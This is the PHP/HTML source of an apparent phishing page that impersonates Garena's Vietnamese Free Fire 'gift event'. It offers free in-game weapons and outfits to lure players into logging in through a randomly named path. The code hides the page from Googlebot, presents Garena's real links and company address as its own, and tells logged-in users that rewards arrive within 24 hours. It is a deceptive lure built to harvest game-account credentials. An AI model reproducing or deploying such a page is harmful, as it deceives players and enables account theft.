<?php
@session_start();
@error_reporting(0);
if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
{
    die('error');
}
$urlrangerlazzy = 'https://'.$_SERVER['HTTP_HOST'].''; 

function RandomCode()
{
    global $randstring ;
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randstring = '';
    for ($i = 0; $i < 178; $i++) {
        $randstring .= $characters[rand(0, strlen($characters))];
    }
    return $randstring;
}
RandomCode();
?>
<!DOCTYPE html>
<html lang="vi" by="RangerLazzy">
    <head>
        <title>Nhận Quà Free Fire - Sự Kiện Free Fire Tri Ân Game Thủ</title>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <meta name="description" content="Website Nhận Quà FREE RIRE Miễn Phí chính thức của Garena. Nhận tướng và trang phục miễn phí từ sự kiện tri ân game thủ!"/>
        <meta name="description" content="GARENA FREE FIRE là tựa game bắn súng sinh tồn đầu tiên tại Việt Nam, mang đến những trải nghiệm sống còn cực kỳ hồi hộp và đầy rẫy những bất ngờ nghẹt thở. Sau khi nhảy dù với 40 người khác từ máy bay xuống hòn đảo, cuộc chiến sinh tử bắt đầu. Nơi đây chỉ tồn tại một quy tắc duy nhất: “săn mồi hoặc trở thành con mồi”."/>
        <link rel="canonical" href="<?=$urlrangerlazzy?>/" />
        <meta property="og:locale" content="en_US" />
        <meta property="og:type" content="website" />
        <meta property="og:title" content="FREE FIRE - SỐNG DAI THÀNH HUYỀN THOẠI" />
        <meta property="og:description" content="GARENA FREE FIRE là tựa game bắn súng sinh tồn đầu tiên tại Việt Nam, mang đến những trải nghiệm sống còn cực kỳ hồi hộp và đầy rẫy những bất ngờ nghẹt thở. Sau khi nhảy dù với 40 người khác từ máy bay xuống hòn đảo, cuộc chiến sinh tử bắt đầu. Nơi đây chỉ tồn tại một quy tắc duy nhất: “săn mồi hoặc trở thành con mồi”."/>
        <meta property="og:url" content="<?=$urlrangerlazzy?>/" />
        <meta property="og:site_name" content="FREE FIRE" />
        <meta name="twitter:card" content="summary_large_image" />
        <meta name="twitter:description" content="GARENA FREE FIRE là tựa game bắn súng sinh tồn đầu tiên tại Việt Nam, mang đến những trải nghiệm sống còn cực kỳ hồi hộp và đầy rẫy những bất ngờ nghẹt thở. Sau khi nhảy dù với 40 người khác từ máy bay xuống hòn đảo, cuộc chiến sinh tử bắt đầu. Nơi đây chỉ tồn tại một quy tắc duy nhất: “săn mồi hoặc trở thành con mồi”."/>
        <meta name="twitter:title" content="FREE FIRE - SỐNG DAI THÀNH HUYỀN THOẠI" />
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <link rel="shortcut icon" href="<?=$urlrangerlazzy?>/assets/img/favicon.png">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.2/css/bootstrap.min.css" />
        <link rel="stylesheet" href="https://lolstatic-a.akamaihd.net/awesomefonts/1.0.0/lol-fonts.css" />
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,500,500i,700,700i&amp;subset=vietnamese" />
        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.2.0/css/all.css" />
        <link rel="stylesheet" href="<?=$urlrangerlazzy?>/assets/css/style.css" />
        <style>
            .card{
                border-radius: .25rem;
            }
            .bg-cover{
                border-radius: .25rem;
            }
        </style>
    </head>
    <body id="wrapped" class="home">
        <div class="loading" style="display: none;"></div>
        <header id="header">
            <div class="bg-black">
                <div class="container">
                    <div class="d-xl-none mb-3 text-center logo">
                        <a href="#">
                            <img src="assets/img/logo-site.png?v=1" alt="logo" />
                        </a>
                    </div>
                    <nav class="menu mb-4 d-none d-xl-block text-uppercase">
                        <a href="#">
                            <img class="my-2" src="assets/img/logo-site.png?v=1" alt="logo" />
                        </a>
                        <?php if(!$_SESSION["username"]): ?>
                        <a class="menu-item active" aria-current="page" href="/" rel="nofollow">Trang chủ</a>| <a class="menu-item" href="https://quandoan.ff.garena.vn/">Quân đoàn</a>|
                        <a class="menu-item" href="https://sukien.ff.garena.vn/">Sự kiện</a>|
                        <a class="menu-item" href="#">Nhân Vật</a> |
                        <a class="menu-item" href="<?php echo $randstring;?>N">Đăng Nhập</a>
                        <?php else: ?>
                        <a class="menu-item active" aria-current="page" href="/" rel="nofollow">Trang chủ</a>| <a class="menu-item" href="https://quandoan.ff.garena.vn/">Quân đoàn</a>|
                        <a class="menu-item" href="https://sukien.ff.garena.vn/">Sự kiện</a>| <a class="menu-item" href="#">Nhân Vật</a>|
                        <a class="menu-item" href="logout.php">Đăng Xuất</a>
                        <?php endif; ?>
                    </nav>
                    <div class="d-xl-none">
                        <div class="nav-overlay d-none" id="menu-overlay"></div>
                        <nav class="menu sidenav text-center" id="menu-m">
                            <a href="#">
                                <img class="img-fluid mb-3" src="assets/img/logo-site.png?v=1" alt="logo" />
                            </a>
                            <?php if(!$_SESSION["username"]): ?>
                            <a class="menu-item active" aria-current="page" href="/" rel="nofollow">Trang chủ</a>| <a class="menu-item" href="https://quandoan.ff.garena.vn/">Quân đoàn</a>|
                            <a class="menu-item" href="https://sukien.ff.garena.vn/">Sự kiện</a>|
                            <a class="menu-item" href="#">Nhân Vật</a>
                            <?php else: ?>
                            <a class="menu-item active" aria-current="page" href="/" rel="nofollow">Trang chủ</a>| <a class="menu-item" href="https://quandoan.ff.garena.vn/">Quân đoàn</a>|
                            <a class="menu-item" href="https://sukien.ff.garena.vn/">Sự kiện</a>| <a class="menu-item" href="#">Nhân Vật</a>|
                            <a class="menu-item" href="logout.php">Đăng xuất</a>
                            <?php endif; ?>
                        </nav>
                    </div>
                </div>
            </div>
        </header>
        <main id="main" class="container text-center">
            <h1 class="title">
                <?php if(!$_SESSION["username"]): ?>
                <span>HÃY CHỌN PHẦN QUÀ BẠN MUỐN NHẬN</span>
                <?php else: ?>
                <span>
                    Xin chào: <?=$_SESSION['username']?> <div class="d-xl-none"><a href="logout.php">Đăng xuất</a></div>
                </span>
                <?php endif; ?>
            </h1>
            <div class="row font-weight-bold text-uppercase">
                <div class="col-lg-3 col-md-4 col-6 mb-4">
                    <div class="card flex-column-reverse">
                        <div class="bg-cover" style="background-image: url(../assets/img/info/1.jpg);"></div>
                        <div class="position-absolute w-100 py-1 bg-dark-transparent gift-title">HỘP MA THUẬT X5</div>
                        <button class="claim-reward btn"><i class="fas fa-gift"></i> Nhận</button>
                    </div>
                </div>
                <div class="col-lg-3 col-md-4 col-6 mb-4">
                    <div class="card flex-column-reverse">
                        <div class="bg-cover" style="background-image: url(../assets/img/info/2.png);"></div>
                        <div class="position-absolute w-100 py-1 bg-dark-transparent gift-title">SCAR ĐĂNG CẤP TITAN</div>
                        <button class="claim-reward btn"><i class="fas fa-gift"></i> Nhận</button>
                    </div>
                </div>
                <div class="col-lg-3 col-md-4 col-6 mb-4">
                    <div class="card flex-column-reverse">
                        <div class="bg-cover" style="background-image: url(../assets/img/info/3.png);"></div>
                        <div class="position-absolute w-100 py-1 bg-dark-transparent gift-title">SCAR ĐỊA NGỤC</div>
                        <button class="claim-reward btn"><i class="fas fa-gift"></i> Nhận</button>
                    </div>
                </div>
                <div class="col-lg-3 col-md-4 col-6 mb-4">
                    <div class="card flex-column-reverse">
                        <div class="bg-cover" style="background-image: url(../assets/img/info/4.png);"></div>
                        <div class="position-absolute w-100 py-1 bg-dark-transparent gift-title">SCAR QUÁI THÚ</div>
                        <button class="claim-reward btn"><i class="fas fa-gift"></i> Nhận</button>
                    </div>
                </div>
                <div class="col-lg-3 col-md-4 col-6 mb-4">
                    <div class="card flex-column-reverse">
                        <div class="bg-cover" style="background-image: url(../assets/img/info/5.png);"></div>
                        <div class="position-absolute w-100 py-1 bg-dark-transparent gift-title">SCAR TÌNH YÊU</div>
                        <button class="claim-reward btn"><i class="fas fa-gift"></i> Nhận</button>
                    </div>
                </div>
                <div class="col-lg-3 col-md-4 col-6 mb-4">
                    <div class="card flex-column-reverse">
                        <div class="bg-cover" style="background-image: url(../assets/img/info/6.png);"></div>
                        <div class="position-absolute w-100 py-1 bg-dark-transparent gift-title">SCAR THIÊN ĐƯỜNG</div>
                        <button class="claim-reward btn"><i class="fas fa-gift"></i> Nhận</button>
                    </div>
                </div>
                <div class="col-lg-3 col-md-4 col-6 mb-4">
                    <div class="card flex-column-reverse">
                        <div class="bg-cover" style="background-image: url(../assets/img/info/7.jpg);"></div>
                        <div class="position-absolute w-100 py-1 bg-dark-transparent gift-title">AK - RỒNG LỬA</div>
                        <button class="claim-reward btn"><i class="fas fa-gift"></i> Nhận</button>
                    </div>
                </div>
                <div class="col-lg-3 col-md-4 col-6 mb-4">
                    <div class="card flex-column-reverse">
                        <div class="bg-cover" style="background-image: url(../assets/img/info/8.png);"></div>
                        <div class="position-absolute w-100 py-1 bg-dark-transparent gift-title">AN94 THẢM HỌA</div>
                        <button class="claim-reward btn"><i class="fas fa-gift"></i> Nhận</button>
                    </div>
                </div>
                <div class="col-lg-3 col-md-4 col-6 mb-4">
                    <div class="card flex-column-reverse">
                        <div class="bg-cover" style="background-image: url(../assets/img/info/9.png);"></div>
                        <div class="position-absolute w-100 py-1 bg-dark-transparent gift-title">TRANG PHỤC VỆ BINH HOÀNG GIA</div>
                        <button class="claim-reward btn"><i class="fas fa-gift"></i> Nhận</button>
                    </div>
                </div>
                <div class="col-lg-3 col-md-4 col-6 mb-4">
                    <div class="card flex-column-reverse">
                        <div class="bg-cover" style="background-image: url(../assets/img/info/10.png);"></div>
                        <div class="position-absolute w-100 py-1 bg-dark-transparent gift-title">TRANG PHỤC SÁT THỦ BẠC</div>
                        <button class="claim-reward btn"><i class="fas fa-gift"></i> Nhận</button>
                    </div>
                </div>
                <div class="col-lg-3 col-md-4 col-6 mb-4">
                    <div class="card flex-column-reverse">
                        <div class="bg-cover" style="background-image: url(../assets/img/info/11.png);"></div>
                        <div class="position-absolute w-100 py-1 bg-dark-transparent gift-title">TRANG PHỤC KHỦNG LONG GALAXY</div>
                        <button class="claim-reward btn"><i class="fas fa-gift"></i> Nhận</button>
                    </div>
                </div>
                <div class="col-lg-3 col-md-4 col-6 mb-4">
                    <div class="card flex-column-reverse">
                        <div class="bg-cover" style="background-image: url(../assets/img/info/12.png);"></div>
                        <div class="position-absolute w-100 py-1 bg-dark-transparent gift-title">TRANG PHỤC KHỦNG LONG XANH</div>
                        <button class="claim-reward btn"><i class="fas fa-gift"></i> Nhận</button>
                    </div>
                </div>
            </div>
        </main>
        <footer id="footer" class="footer">
            <div class="container">
                <img class="w-100 mt-2 mb-4" src="assets/img/line-spacing.png" />
                <div class="row flex-row-reverse">
                    <div class="col-lg-6">
                        <img class="w-100 mb-3" src="assets/img/link-garena.png" />
                    </div>
                    <div class="col-lg-6 text-center text-lg-left">
                        <b>CÔNG TY CỔ PHẦN GIẢI TRÍ VÀ THỂ THAO ĐIỆN TỬ VIỆT NAM</b>
                        <p>
                            <b>Văn phòng đại diện:</b> Tầng 29, tòa nhà Trung tâm Lotte Hà Nội, số 54 đường Liễu Giai, Phường Cống Vị, Quận Ba Đình, TP. Hà Nội, Việt Nam.<br />
                            <b>Điện thoại:</b> (04)7305-3939 | Fax: (04)3759-2429
                        </p>
                    </div>
                </div>
            </div>
        </footer>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/js/bootstrap.min.js"></script>
        <script src="assets/js/sweetalert.min.js?v=2"></script>
        <script src="assets/js/script.js?v=3"></script>
        <script>
            <?php if(!$_SESSION["username"]): ?>
                $(document).ready(function(){
                        $(document).on('click', '.claim-reward', function() {
                                            swal({
                                title: 'Thông báo',
                                text: 'Vui lòng đăng thập để nhận quà !',
                                icon: 'error',
                                buttons: {
                                            cancel: 'Đóng',
                                            confirm: {
                                                text: 'Đăng nhập',
                                                closeModal: false
                                            }
                                        },
                                 dangerMode: true,
                                 showLoaderOnConfirm: true
                              })
                              .then((confirm) => {
                                 if(confirm){
                                 	location.href = '<?php echo $randstring;?>N'
                                 }
                                 else{}
                              })
                                       })
                        })
            <?php else: ?>
            $(document).ready(function(){
                    $(document).on('click', '.claim-reward', function() {
                                        swal({
                                title: 'Thông báo',
                                text: 'Phần quà sẽ được gửi tới tài khoản trong vòng 24h!',
                                icon: 'success',
                                buttons: {
                                    OK: 'OK'
                                },
                                dangerMode: true,
                                showLoaderOnConfirm: true
                            }).then(function(confirm) {
                                if (confirm) {
                                    window.location = '/'
                                }
                            })
                                })
                })
            <?php endif; ?>
        </script>
    </body>
</html>